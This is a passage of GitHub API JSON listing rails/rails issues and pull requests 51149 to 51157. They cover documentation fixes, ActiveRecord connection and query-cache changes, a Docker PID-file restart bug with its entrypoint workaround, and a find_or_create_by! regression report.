            "avatar_url": "https://avatars.githubusercontent.com/u/5461802?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/aveedibya",
            "html_url": "https://github.com/aveedibya",
            "followers_url": "https://api.github.com/users/aveedibya/followers",
            "following_url": "https://api.github.com/users/aveedibya/following{/other_user}",
            "gists_url": "https://api.github.com/users/aveedibya/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/aveedibya/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/aveedibya/subscriptions",
            "organizations_url": "https://api.github.com/users/aveedibya/orgs",
            "repos_url": "https://api.github.com/users/aveedibya/repos",
            "events_url": "https://api.github.com/users/aveedibya/events{/privacy}",
            "received_events_url": "https://api.github.com/users/aveedibya/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-21T23:10:48Z",
        "updated_at": "2024-02-22T19:58:44Z",
        "closed_at": "2024-02-22T19:58:44Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51157",
            "html_url": "https://github.com/rails/rails/pull/51157",
            "diff_url": "https://github.com/rails/rails/pull/51157.diff",
            "patch_url": "https://github.com/rails/rails/pull/51157.patch",
            "merged_at": "2024-02-22T19:58:43Z"
        },
        "body": "Included documentation around usage of the `key` parameter in `.attach` method to specify folders within S3 Bucket for organizing files and storing them with intuitive names.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51157/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51157/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51156",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51156/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51156/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51156/events",
        "html_url": "https://github.com/rails/rails/pull/51156",
        "id": 2147733816,
        "node_id": "PR_kwDNIULOZ5OFeg",
        "number": 51156,
        "title": "Respect raise_on_missing_translations in controller's translations",
        "user": {
            "login": "jhawthorn",
            "id": 131752,
            "node_id": "MDQ6VXNlcjEzMTc1Mg==",
            "avatar_url": "https://avatars.githubusercontent.com/u/131752?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/jhawthorn",
            "html_url": "https://github.com/jhawthorn",
            "followers_url": "https://api.github.com/users/jhawthorn/followers",
            "following_url": "https://api.github.com/users/jhawthorn/following{/other_user}",
            "gists_url": "https://api.github.com/users/jhawthorn/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/jhawthorn/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/jhawthorn/subscriptions",
            "organizations_url": "https://api.github.com/users/jhawthorn/orgs",
            "repos_url": "https://api.github.com/users/jhawthorn/repos",
            "events_url": "https://api.github.com/users/jhawthorn/events{/privacy}",
            "received_events_url": "https://api.github.com/users/jhawthorn/received_events",
            "type": "User",
            "site_admin": true
        },
        "labels": [
            {
                "id": 107189,
                "node_id": "MDU6TGFiZWwxMDcxODk=",
                "url": "https://api.github.com/repos/rails/rails/labels/actionpack",
                "name": "actionpack",
                "color": "FFF700",
                "default": false,
                "description": null
            },
            {
                "id": 107194,
                "node_id": "MDU6TGFiZWwxMDcxOTQ=",
                "url": "https://api.github.com/repos/rails/rails/labels/activesupport",
                "name": "activesupport",
                "color": "FC9300",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-21T21:21:46Z",
        "updated_at": "2024-02-21T21:46:43Z",
        "closed_at": "2024-02-21T21:46:40Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51156",
            "html_url": "https://github.com/rails/rails/pull/51156",
            "diff_url": "https://github.com/rails/rails/pull/51156.diff",
            "patch_url": "https://github.com/rails/rails/pull/51156.patch",
            "merged_at": "2024-02-21T21:46:40Z"
        },
        "body": "Previously raise_on_missing_translations was not being respected in a controller. This commit brings back the correct behaviour.\r\n\r\nThis will be backported to 7-1-stable and 7-0-stable",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51156/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51156/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51155",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51155/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51155/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51155/events",
        "html_url": "https://github.com/rails/rails/issues/51155",
        "id": 2147054596,
        "node_id": "I_kwDNIULOf_l0BA",
        "number": 51155,
        "title": "Default docker setup is not resilient to host abrupt shutdown (ex. power loss). Puma won't due to uncleaned PID file.",
        "user": {
            "login": "K4sku",
            "id": 22965927,
            "node_id": "MDQ6VXNlcjIyOTY1OTI3",
            "avatar_url": "https://avatars.githubusercontent.com/u/22965927?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/K4sku",
            "html_url": "https://github.com/K4sku",
            "followers_url": "https://api.github.com/users/K4sku/followers",
            "following_url": "https://api.github.com/users/K4sku/following{/other_user}",
            "gists_url": "https://api.github.com/users/K4sku/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/K4sku/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/K4sku/subscriptions",
            "organizations_url": "https://api.github.com/users/K4sku/orgs",
            "repos_url": "https://api.github.com/users/K4sku/repos",
            "events_url": "https://api.github.com/users/K4sku/events{/privacy}",
            "received_events_url": "https://api.github.com/users/K4sku/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2024-02-21T15:33:23Z",
        "updated_at": "2024-02-22T09:20:15Z",
        "closed_at": "2024-02-22T09:20:15Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n1. Generate new rails project.\r\n2. Deploy it to a server using a template Dockerfile and docker-entrypoint script with docker's restart option `--restart unless-stopped`.\r\n3. Power off the server.\r\n4. Power on the server.\r\n5. The container will fail to start. Inspecting docker logs will show:\r\n\r\n```\r\n=> Booting Puma\r\n=> Rails 7.1.2 application starting in staging\r\n=> Run `bin/rails server --help` for more startup options\r\nA server is already running (pid: 1, file: /rails/tmp/pids/server.pid).\r\nExiting\r\n```\r\n\r\nI do not see a way to write a test case for it. Sorry.\r\n\r\n### Expected behavior\r\nThe server would start after host power is restored.\r\n\r\n### Actual behavior\r\nThe server cannot start, the container keeps restarting. \r\n\r\n### System configuration\r\n**Rails version**: 7.1.1\r\n\r\n**Ruby version**: 3.2.2\r\n\r\nI encountered this issue when working with Kamal gem. \r\n\r\n----\r\n\r\nThe solution I used is expanding a docker-entrypoint script\r\n\r\n\\# bin/docker-entrypoint\r\n```bash\r\n#!/bin/bash -e\r\n# If there is an existing PID puma file then remove it\r\nif [ -f /rails/tmp/pids/server.pid ]; then\r\n  rm /rails/tmp/pids/server.pid\r\nfi\r\n\r\n# If running the rails server then create or migrate existing database\r\nif [ \"${1}\" == \"./bin/rails\" ] && [ \"${2}\" == \"server\" ]; then\r\n  ./bin/rails db:prepare\r\nfi\r\n\r\nexec \"${@}\"\r\n```",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51155/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51155/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51154",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51154/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51154/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51154/events",
        "html_url": "https://github.com/rails/rails/pull/51154",
        "id": 2146620771,
        "node_id": "PR_kwDNIULOZ4QfHw",
        "number": 51154,
        "title": "Make `.connection` always return a permanently leased connection",
        "user": {
            "login": "casperisfine",
            "id": 19192189,
            "node_id": "MDQ6VXNlcjE5MTkyMTg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/19192189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/casperisfine",
            "html_url": "https://github.com/casperisfine",
            "followers_url": "https://api.github.com/users/casperisfine/followers",
            "following_url": "https://api.github.com/users/casperisfine/following{/other_user}",
            "gists_url": "https://api.github.com/users/casperisfine/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/casperisfine/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/casperisfine/subscriptions",
            "organizations_url": "https://api.github.com/users/casperisfine/orgs",
            "repos_url": "https://api.github.com/users/casperisfine/repos",
            "events_url": "https://api.github.com/users/casperisfine/events{/privacy}",
            "received_events_url": "https://api.github.com/users/casperisfine/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 6,
        "created_at": "2024-02-21T12:21:05Z",
        "updated_at": "2024-02-26T10:54:09Z",
        "closed_at": "2024-02-23T08:25:57Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51154",
            "html_url": "https://github.com/rails/rails/pull/51154",
            "diff_url": "https://github.com/rails/rails/pull/51154.diff",
            "patch_url": "https://github.com/rails/rails/pull/51154.patch",
            "merged_at": null
        },
        "body": "Ref: https://github.com/rails/rails/pull/51083\r\n\r\nThe introduction of `ActiveRecord::Base.with_connection` somewhat broke some expectations, namely that calling `.connection` would cause the connection to be permenently leased, hence that future calls to it would return the same connection, with all it's possible environmental changes.\r\n\r\nSo any call to `.connection`, even inside `.with_connection` should cause the lease to be sticky, and persist beyond the `with_connection` block.\r\n\r\ncc @bensheldon @matthewd as discussed on the previous PR.\r\n\r\nTo be frank, I'm a bit on the fence about this one. I totally understand the compatibility argument, but this makes https://github.com/rails/rails/pull/50793 way harder (if not impossible) to achieve. Unless we introduce some (private?) alternative to `.connection` which essentially does the same but doesn't extend the lease.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51154/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51154/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51153",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51153/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51153/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51153/events",
        "html_url": "https://github.com/rails/rails/pull/51153",
        "id": 2146472129,
        "node_id": "PR_kwDNIULOZ4INcg",
        "number": 51153,
        "title": "Fix code formatting in layouts and rendering guide [skip ci]",
        "user": {
            "login": "dzjuck",
            "id": 1269260,
            "node_id": "MDQ6VXNlcjEyNjkyNjA=",
            "avatar_url": "https://avatars.githubusercontent.com/u/1269260?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/dzjuck",
            "html_url": "https://github.com/dzjuck",
            "followers_url": "https://api.github.com/users/dzjuck/followers",
            "following_url": "https://api.github.com/users/dzjuck/following{/other_user}",
            "gists_url": "https://api.github.com/users/dzjuck/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/dzjuck/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/dzjuck/subscriptions",
            "organizations_url": "https://api.github.com/users/dzjuck/orgs",
            "repos_url": "https://api.github.com/users/dzjuck/repos",
            "events_url": "https://api.github.com/users/dzjuck/events{/privacy}",
            "received_events_url": "https://api.github.com/users/dzjuck/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-21T11:04:54Z",
        "updated_at": "2024-02-21T11:09:02Z",
        "closed_at": "2024-02-21T11:08:56Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51153",
            "html_url": "https://github.com/rails/rails/pull/51153",
            "diff_url": "https://github.com/rails/rails/pull/51153.diff",
            "patch_url": "https://github.com/rails/rails/pull/51153.patch",
            "merged_at": "2024-02-21T11:08:56Z"
        },
        "body": null,
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51153/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51153/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51152",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51152/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51152/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51152/events",
        "html_url": "https://github.com/rails/rails/pull/51152",
        "id": 2146417299,
        "node_id": "PR_kwDNIULOZ4FLiQ",
        "number": 51152,
        "title": "Don't forcefully clear temporarily disabled query caches",
        "user": {
            "login": "casperisfine",
            "id": 19192189,
            "node_id": "MDQ6VXNlcjE5MTkyMTg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/19192189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/casperisfine",
            "html_url": "https://github.com/casperisfine",
            "followers_url": "https://api.github.com/users/casperisfine/followers",
            "following_url": "https://api.github.com/users/casperisfine/following{/other_user}",
            "gists_url": "https://api.github.com/users/casperisfine/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/casperisfine/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/casperisfine/subscriptions",
            "organizations_url": "https://api.github.com/users/casperisfine/orgs",
            "repos_url": "https://api.github.com/users/casperisfine/repos",
            "events_url": "https://api.github.com/users/casperisfine/events{/privacy}",
            "received_events_url": "https://api.github.com/users/casperisfine/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-21T10:36:56Z",
        "updated_at": "2024-02-21T10:57:11Z",
        "closed_at": "2024-02-21T10:57:11Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51152",
            "html_url": "https://github.com/rails/rails/pull/51152",
            "diff_url": "https://github.com/rails/rails/pull/51152.diff",
            "patch_url": "https://github.com/rails/rails/pull/51152.patch",
            "merged_at": "2024-02-21T10:57:11Z"
        },
        "body": "Followup: https://github.com/rails/rails/pull/50938\r\n\r\nThe behavior changed to always clear the query cache as soon as it's disabled, on the assumption that once queries have been performed without it, all bets are off.\r\n\r\nHowever that isn't quite true, we can apply the same clearing logic than when it's enabled. If you perform read only queries without the cache, there is no reason to clear it.\r\n\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51152/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51152/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51151",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51151/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51151/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51151/events",
        "html_url": "https://github.com/rails/rails/pull/51151",
        "id": 2146237186,
        "node_id": "PR_kwDNIULOZ37Bzg",
        "number": 51151,
        "title": "clear_query_caches_for_current_thread: avoid pinning all connections",
        "user": {
            "login": "casperisfine",
            "id": 19192189,
            "node_id": "MDQ6VXNlcjE5MTkyMTg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/19192189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/casperisfine",
            "html_url": "https://github.com/casperisfine",
            "followers_url": "https://api.github.com/users/casperisfine/followers",
            "following_url": "https://api.github.com/users/casperisfine/following{/other_user}",
            "gists_url": "https://api.github.com/users/casperisfine/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/casperisfine/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/casperisfine/subscriptions",
            "organizations_url": "https://api.github.com/users/casperisfine/orgs",
            "repos_url": "https://api.github.com/users/casperisfine/repos",
            "events_url": "https://api.github.com/users/casperisfine/events{/privacy}",
            "received_events_url": "https://api.github.com/users/casperisfine/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-21T09:27:38Z",
        "updated_at": "2024-02-21T09:47:45Z",
        "closed_at": "2024-02-21T09:47:45Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51151",
            "html_url": "https://github.com/rails/rails/pull/51151",
            "diff_url": "https://github.com/rails/rails/pull/51151.diff",
            "patch_url": "https://github.com/rails/rails/pull/51151.patch",
            "merged_at": "2024-02-21T09:47:45Z"
        },
        "body": "Ref: https://github.com/rails/rails/pull/51083#discussion_r1496720821\r\n\r\nNow that the pool is owned by the pool, we can clear it without hacing to checkout a connection.\r\n\r\ncc @matthewd @bensheldon ",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51151/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51151/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51150",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51150/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51150/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51150/events",
        "html_url": "https://github.com/rails/rails/pull/51150",
        "id": 2145768557,
        "node_id": "PR_kwDNIULOZ3hRRA",
        "number": 51150,
        "title": "Don't force controller or integration tests to load",
        "user": {
            "login": "eugeneius",
            "id": 432189,
            "node_id": "MDQ6VXNlcjQzMjE4OQ==",
            "avatar_url": "https://avatars.githubusercontent.com/u/432189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/eugeneius",
            "html_url": "https://github.com/eugeneius",
            "followers_url": "https://api.github.com/users/eugeneius/followers",
            "following_url": "https://api.github.com/users/eugeneius/following{/other_user}",
            "gists_url": "https://api.github.com/users/eugeneius/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/eugeneius/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/eugeneius/subscriptions",
            "organizations_url": "https://api.github.com/users/eugeneius/orgs",
            "repos_url": "https://api.github.com/users/eugeneius/repos",
            "events_url": "https://api.github.com/users/eugeneius/events{/privacy}",
            "received_events_url": "https://api.github.com/users/eugeneius/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-21T03:57:54Z",
        "updated_at": "2024-02-21T16:03:57Z",
        "closed_at": "2024-02-21T16:03:57Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51150",
            "html_url": "https://github.com/rails/rails/pull/51150",
            "diff_url": "https://github.com/rails/rails/pull/51150.diff",
            "patch_url": "https://github.com/rails/rails/pull/51150.patch",
            "merged_at": "2024-02-21T16:03:57Z"
        },
        "body": "https://github.com/rails/rails/pull/32776 replaced references to `ActionController::TestCase` and `ActionDispatch::IntegrationTest` in this file with lazy load hooks to avoid loading them prematurely, but these requires meant that they were still loaded anyway.\r\n\r\nAside from the direct benefit of loading as little as possible until necessary, this will allow users of https://github.com/amatsuda/routes_lazy_routes to run e.g. a model test without loading the application's routes, which can reduce boot time significantly for large applications.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51150/reactions",
            "total_count": 2,
            "+1": 2,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51150/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51149",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51149/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51149/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51149/events",
        "html_url": "https://github.com/rails/rails/issues/51149",
        "id": 2145626552,
        "node_id": "I_kwDNIULOf-OpuA",
        "number": 51149,
        "title": "find_or_create_by! behavior raises RecordNotFound in Rails 7.1",
        "user": {
            "login": "tubaxenor",
            "id": 1394393,
            "node_id": "MDQ6VXNlcjEzOTQzOTM=",
            "avatar_url": "https://avatars.githubusercontent.com/u/1394393?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/tubaxenor",
            "html_url": "https://github.com/tubaxenor",
            "followers_url": "https://api.github.com/users/tubaxenor/followers",
            "following_url": "https://api.github.com/users/tubaxenor/following{/other_user}",
            "gists_url": "https://api.github.com/users/tubaxenor/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/tubaxenor/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/tubaxenor/subscriptions",
            "organizations_url": "https://api.github.com/users/tubaxenor/orgs",
            "repos_url": "https://api.github.com/users/tubaxenor/repos",
            "events_url": "https://api.github.com/users/tubaxenor/events{/privacy}",
            "received_events_url": "https://api.github.com/users/tubaxenor/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 4,
        "created_at": "2024-02-21T02:02:22Z",
        "updated_at": "2024-02-22T16:34:08Z",
        "closed_at": "2024-02-22T16:34:08Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n<!-- (Guidelines for creating a bug report are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#creating-a-bug-report)) -->\r\n\r\n<!-- Paste your executable test case created from one of the scripts found [here](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#create-an-executable-test-case) below: -->\r\n```ruby\r\n# frozen_string_literal: true\r\n\r\nrequire \"bundler/inline\"\r\n\r\ngemfile(true) do\r\n  source \"https://rubygems.org\"\r\n\r\n  git_source(:github) { |repo| \"https://github.com/#{repo}.git\" }\r\n  \t\r\n  gem \"rails\", github: \"rails/rails\", branch: \"7-1-stable\"\r\n  # Switch to below works\r\n  # gem \"rails\", github: \"rails/rails\", branch: \"7-0-stable\"\r\n  gem \"mysql2\"\r\nend\r\n\r\nrequire \"active_record\"\r\nrequire \"minitest/autorun\"\r\nrequire \"logger\"\r\n\r\nopts = {\r\n  database: \"unique_keys_test\",\r\n  adapter: \"mysql2\",\r\n  username: \"root\"\r\n}\r\nActiveRecord::Base.logger = Logger.new(STDOUT)\r\nActiveRecord::Base.establish_connection(opts.except(:database))\r\nActiveRecord::Base.connection.drop_database(opts[:database])\r\nActiveRecord::Base.connection.create_database(opts[:database])\r\nActiveRecord::Base.establish_connection(opts)\r\n\r\nActiveRecord::Schema.define do\r\n  create_table :tags, force: true do |t|\r\n    t.string :foo\r\n    t.bigint :foo_id\r\n    t.string :name\r\n    t.index [:foo, :foo_id], unique: true\r\n  end\r\nend\r\n\r\nclass Tag < ActiveRecord::Base\r\nend\r\n\r\nclass BugTest < Minitest::Test\r\n  def test_find_or_create_by\r\n    2.times do |t|\r\n      begin\r\n        Tag.find_or_create_by!(foo: 'Foo', foo_id: 1, name: \"foo_#{t}\")\r\n      rescue ActiveRecord::RecordNotUnique\r\n        # some app logic that handles RecordNotUnique\r\n      end\r\n    end\r\n\r\n    assert_equal 1, Tag.count\r\n  end\r\nend\r\n\r\n```\r\n\r\n### Expected behavior\r\nThis is almost the same as https://github.com/rails/rails/issues/48035 but without concurrency involved.\r\n\r\nIn Rails 7.0, `find_or_create_by!` with duplicated uniqueness constraints raises `ActiveRecord::RecordNotUnique` error\r\n\r\n### Actual behavior\r\nIn Rails 7.1, the above example raises `ActiveRecord::RecordNotFound` with following sql queries:\r\n\r\n```\r\nD, [2024-02-21T09:55:06.652671 #36179] DEBUG -- :   Tag Load (0.7ms)  SELECT `tags`.* FROM `tags` WHERE `tags`.`foo` = 'Foo' AND `tags`.`foo_id` = 1 AND `tags`.`name` = 'foo_0' LIMIT 1\r\nD, [2024-02-21T09:55:06.653057 #36179] DEBUG -- :   TRANSACTION (0.1ms)  BEGIN\r\nD, [2024-02-21T09:55:06.665723 #36179] DEBUG -- :   Tag Create (0.3ms)  INSERT INTO `tags` (`foo`, `foo_id`, `name`) VALUES ('Foo', 1, 'foo_0')\r\nD, [2024-02-21T09:55:06.666365 #36179] DEBUG -- :   TRANSACTION (0.6ms)  COMMIT\r\nD, [2024-02-21T09:55:06.666758 #36179] DEBUG -- :   Tag Load (0.2ms)  SELECT `tags`.* FROM `tags` WHERE `tags`.`foo` = 'Foo' AND `tags`.`foo_id` = 1 AND `tags`.`name` = 'foo_1' LIMIT 1\r\nD, [2024-02-21T09:55:06.666985 #36179] DEBUG -- :   TRANSACTION (0.1ms)  BEGIN\r\nD, [2024-02-21T09:55:06.667332 #36179] DEBUG -- :   Tag Create (0.4ms)  INSERT INTO `tags` (`foo`, `foo_id`, `name`) VALUES ('Foo', 1, 'foo_1')\r\nD, [2024-02-21T09:55:06.667620 #36179] DEBUG -- :   TRANSACTION (0.2ms)  ROLLBACK\r\nD, [2024-02-21T09:55:06.667940 #36179] DEBUG -- :   Tag Load (0.2ms)  SELECT `tags`.* FROM `tags` WHERE `tags`.`foo` = 'Foo' AND `tags`.`foo_id` = 1 AND `tags`.`name` = 'foo_1' LIMIT 1\r\n```\r\n\r\n### System configuration\r\n**Rails version**: 7.1.3\r\n\r\n**Ruby version**: 3.3.0\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51149/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51149/timeline",
        "performed_via_github_app": null,
        "state_reason": "not_planned"
